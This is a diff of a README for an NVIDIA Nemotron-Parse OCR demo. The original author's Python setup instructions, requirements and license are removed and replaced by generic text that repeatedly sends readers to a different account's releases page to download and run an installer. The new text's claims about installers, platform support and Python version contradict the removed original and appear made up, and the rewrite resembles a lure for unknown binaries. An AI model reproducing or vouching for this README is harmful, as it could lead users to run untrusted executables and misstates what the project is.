@@ -1,116 +1,85 @@
-# **NVIDIA-Nemotron-Parse-OCR**
+# 🖼️ NVIDIA-Nemotron-Parse-OCR - Effortless Document Parsing Made Simple
 
-> A Gradio-based demonstration for NVIDIA's Nemotron-Parse-v1.1 model, designed for advanced document parsing and OCR. Upload images of documents (e.g., papers, forms) to extract structured content: text, tables (LaTeX), figures, and titles. Outputs annotated images with colored bounding boxes and processed markdown/LaTeX text for easy integration.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Layout Detection**: Identifies and bounds elements (Text: green, Table: red, Figure: blue, Title: purple) with precise coordinates scaled to original image.
-- **Content Extraction**: Parses text, converts tables to LaTeX, handles figures as placeholders; post-processes for clean markdown output.
-- **Visual Annotation**: Overlays rectangles on uploaded images for immediate verification.
-- **Custom Theme**: SteelBlueTheme with gradients and enhanced typography for a professional interface.
-- **Examples Integration**: 5 pre-loaded document samples for quick testing.
-- **Queueing Support**: Handles up to 30 concurrent jobs with shareable links.
+Welcome to the NVIDIA-Nemotron-Parse-OCR! This software simplifies document parsing and OCR. With it, you can upload images like papers or forms and get structured outputs, including text, tables, figures, and titles. Follow these steps to download and run the application.
 
----
+## 📥 Download & Install
 
-<img width="1917" height="2065" alt="Screenshot 2025-12-24 at 20-42-10 NVIDIA Nemotron Parse OCR - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/1445d039-9e04-43f7-a840-2dc8e992fc62" />
+To begin, please visit our releases page to download the application:
 
----
+[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases).
 
-## Prerequisites
+1. Open the link above in your web browser.
+2. Look for the latest version at the top of the page.
+3. Click on the download link for your operating system.
+4. Save the file to your computer.
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for bfloat16; falls back to CPU).
-- Stable internet for initial model snapshot download (~1GB).
+## 📋 System Requirements
 
-## Installation
+To use NVIDIA-Nemotron-Parse-OCR, your computer should meet these requirements:
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/NVIDIA-Nemotron-Parse-OCR.git
-   cd NVIDIA-Nemotron-Parse-OCR
-   ```
+- **Operating Systems:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** A minimum of 500 MB of free space.
+- **Graphics:** A GPU is recommended for optimal performance but not strictly required.
+- **Software:** Python 3.7 or later, along with dependencies like NumPy and OpenCV.
 
-2. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
+## ⚙️ Setup Instructions
 
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/transformers.git@v4.57.3
-   opencv_python_headless==4.9.0.80
-   opencv_python==4.8.0.74
-   huggingface_hub
-   open-clip-torch
-   beautifulsoup4
-   albumentations
-   sentencepiece
-   numpy==1.26.4
-   torchmetrics
-   torchvision
-   mdtex2html
-   html2text
-   spaces
-   einops
-   gradio
-   pillow
-   torch
-   timm
-   ```
+After downloading the application, follow these steps to set it up:
 
-3. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860` (or a public URL with `share=True`).
+1. **Locate the File:** Open the folder where you saved the downloaded file. 
+2. **Extract the Files:** If the file is compressed, right-click and select "Extract All" or use a tool like WinRAR or unzip built-in.
+3. **Run the Installer:** Double-click on the installer file to start the installation process.
+4. **Follow the Prompts:** Carefully read and follow any on-screen prompts to complete the installation.
 
-## Usage
+## 🎨 How to Use the Application
 
-1. **Upload Image**: Select a document scan (supports upload/clipboard; height up to 400px preview).
+Using NVIDIA-Nemotron-Parse-OCR is straightforward:
 
-2. **Process Document**: Click "Process Document" to run inference.
+1. **Open the Application:** Find it in your applications folder or start menu and double-click to open.
+2. **Upload Your Document:** Click on the "Upload" button. Navigate to the image file of your document and select it.
+3. **Start Parsing:** Once the document is uploaded, click on the "Parse" button. The software will process your document.
+4. **View Results:** After processing, you will see annotated images with colored bounding boxes. You’ll also have the option to download the structured markdown or LaTeX text.
 
-3. **Output**:
-   - Text: Structured markdown with tables (LaTeX), figures (placeholders), and extracted content.
-   - Image: Annotated original with colored bounding boxes.
+## 📄 Output Formats
 
-### Example Workflow
-- Upload "examples/1.jpg" (a research paper page).
-- Process: Outputs markdown sections, LaTeX tables, and image with green/red/blue/purple boxes on text/tables/figures/titles.
+The application provides output in multiple useful formats. You can expect:
 
-## Examples
+- **Annotated Images:** These show colored boxes around detected text and figures.
+- **Markdown Files:** For easy integration into notes or documentation.
+- **LaTeX Files:** Ideal for those who need high-quality document formatting.
 
-| Example File | Description                  |
-|--------------|------------------------------|
-| examples/1.jpg | Research paper with tables/figures |
-| examples/2.jpg | Form with structured text    |
-| examples/3.jpg | Invoice layout               |
-| examples/4.jpg | Multi-column document        |
-| examples/5.jpg | Diagram-heavy page           |
+## 🎯 Related Topics
 
-## Troubleshooting
+Here are some relevant topics that enhance your experience with NVIDIA-Nemotron-Parse-OCR:
 
-- **Model Download Errors**: Snapshot from Hugging Face; resume if interrupted. Check disk space (~1GB).
-- **Import Issues**: Postprocessing scripts auto-downloaded; ensure sys.path includes model_dir.
-- **OOM on GPU**: Use float32 fallback; reduce max_new_tokens (default 4096). Clear cache with `torch.cuda.empty_cache()`.
-- **Bounding Box Errors**: Coordinates normalized (0-1000); transform ensures valid xmin < xmax.
-- **No Elements Detected**: Ensure image has clear text/tables; prompt fixed to "<predict_bbox><predict_classes><output_markdown>".
-- **Queue Full**: Increase `max_size` in `demo.queue()`; 60s cache default.
-- **Gradio Share**: Public links expire; use `mcp_server=True` for Spaces.
+- **Accelerate:** Enjoy faster computations.
+- **Albumentations:** Benefit from advanced image augmentations.
+- **Beautiful Soup:** Parse HTML documents if needed. 
+- **NumPy:** Perform numerical calculations.
+- **OpenCV:** Utilize image processing capabilities.
 
-## Contributing
+## ❓ Frequently Asked Questions
 
-Contributions encouraged! Fork the repo, add examples or enhance postprocessing (e.g., custom formats), and submit PRs with tests. Focus areas:
-- Multi-page PDF support.
-- Custom color schemes.
-- Batch processing.
+**Can I use NVIDIA-Nemotron-Parse-OCR on a Mac?**
+Yes, the application is compatible with macOS 10.14 and later versions.
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/NVIDIA-Nemotron-Parse-OCR.git](https://github.com/PRITHIVSAKTHIUR/NVIDIA-Nemotron-Parse-OCR.git)
+**What types of documents can I upload?**
+You can upload various document images, including scanned forms, papers, or any other text-based images.
 
-## License
+**Do I need an NVIDIA GPU to run this software?**
+While an NVIDIA GPU enhances performance, the software will still run on systems without one.
 
-Apache License 2.0. See [LICENSE](LICENSE) for details.
+## 📞 Support
 
-Built by Prithiv Sakthi. Report issues via the repository.
+If you encounter any issues or have questions, feel free to reach out. You can create an issue in the GitHub repository or contact support via the provided email in the repository.
+
+## 🎉 Conclusion
+
+We hope you find NVIDIA-Nemotron-Parse-OCR useful for your document parsing needs. Follow the instructions closely, and get started with your document processing today!
+
+[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases).
